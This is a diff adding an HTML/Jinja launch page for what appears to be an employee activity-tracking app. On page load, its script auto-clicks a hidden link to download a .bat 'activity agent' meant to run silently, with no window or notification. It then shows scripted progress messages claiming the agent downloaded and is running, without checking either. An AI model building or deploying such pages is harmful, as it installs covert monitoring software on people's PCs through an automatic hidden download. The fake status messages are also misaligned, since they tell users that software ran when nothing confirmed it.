@@ -1,0 +1,99 @@
+{% extends "base.html" %}
+{% block title %}Starting Agent — {{ company_name }}{% endblock %}
+
+{% block head %}
+<style>
+  body { display:flex; align-items:center; justify-content:center; min-height:100dvh; padding:1rem; }
+  .launch-card { width:100%; max-width:480px; padding:2.5rem 2rem; text-align:center; }
+  .launch-icon { font-size:4rem; margin-bottom:1rem; animation:spin 2s linear infinite; }
+  @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
+  .steps { text-align:left; margin:1.5rem 0; }
+  .step { display:flex; align-items:center; gap:.75rem; padding:.6rem 0;
+          border-bottom:1px solid var(--glass-border); font-size:.9rem; }
+  .step-icon { font-size:1.3rem; width:2rem; text-align:center; flex-shrink:0; }
+  .step-done { color:var(--status-online); }
+  .step-loading { color:var(--accent-cyan); }
+  .step-wait { color:var(--text-muted); }
+  .note { background:rgba(0,217,255,.08); border:1px solid rgba(0,217,255,.2);
+          border-radius:.5rem; padding:.75rem 1rem; font-size:.82rem;
+          color:var(--text-secondary); margin-top:1rem; text-align:left; }
+</style>
+{% endblock %}
+
+{% block body %}
+<div class="launch-card glass-card">
+  <div class="launch-icon" id="icon">⚙️</div>
+  <h2 class="page-title mb-1">Setting Up Your Session</h2>
+  <p class="page-subtitle" id="statusText">Initializing background agent...</p>
+
+  <div class="steps">
+    <div class="step" id="step1">
+      <span class="step-icon step-done">✅</span>
+      <span>Login verified successfully</span>
+    </div>
+    <div class="step" id="step2">
+      <span class="step-icon step-loading" id="s2icon">⏳</span>
+      <span id="s2text">Downloading activity agent...</span>
+    </div>
+    <div class="step" id="step3">
+      <span class="step-icon step-wait" id="s3icon">⏳</span>
+      <span id="s3text">Starting background service...</span>
+    </div>
+    <div class="step" id="step4">
+      <span class="step-icon step-wait" id="s4icon">⏳</span>
+      <span id="s4text">Redirecting to dashboard...</span>
+    </div>
+  </div>
+
+  <div class="note">
+    💡 <strong>What's happening?</strong><br>
+    A small background agent is being set up to track your activity.
+    It runs silently — you won't see any window or notification.
+    This only needs to happen once per PC.
+  </div>
+
+  <!-- Hidden download link — triggered automatically -->
+  <a id="dlLink" href="/download-agent" style="display:none">download</a>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+function setStep(stepId, iconId, textId, icon, text, iconClass) {
+  document.getElementById(iconId).textContent = icon;
+  document.getElementById(iconId).className = 'step-icon ' + iconClass;
+  if(textId) document.getElementById(textId).textContent = text;
+}
+
+async function launchSequence() {
+  // Step 2: Trigger agent download
+  await new Promise(r => setTimeout(r, 800));
+  setStep(2, 's2icon', 's2text', '⬇️', 'Downloading activity agent...', 'step-loading');
+
+  // Auto-trigger .bat download silently
+  try {
+    document.getElementById('dlLink').click();
+  } catch(e) {}
+
+  await new Promise(r => setTimeout(r, 1200));
+  setStep(2, 's2icon', 's2text', '✅', 'Agent downloaded successfully', 'step-done');
+
+  // Step 3: Starting
+  await new Promise(r => setTimeout(r, 600));
+  setStep(3, 's3icon', 's3text', '🚀', 'Background service starting...', 'step-loading');
+  await new Promise(r => setTimeout(r, 1000));
+  setStep(3, 's3icon', 's3text', '✅', 'Background service running silently', 'step-done');
+
+  // Step 4: Redirect
+  await new Promise(r => setTimeout(r, 500));
+  setStep(4, 's4icon', 's4text', '🏠', 'Taking you to dashboard...', 'step-loading');
+  document.getElementById('icon').textContent = '✅';
+  document.getElementById('icon').style.animation = 'none';
+  document.getElementById('statusText').textContent = 'All done! Loading dashboard...';
+  await new Promise(r => setTimeout(r, 800));
+  window.location.href = '/staff';
+}
+
+document.addEventListener('DOMContentLoaded', launchSequence);
+</script>
+{% endblock %}
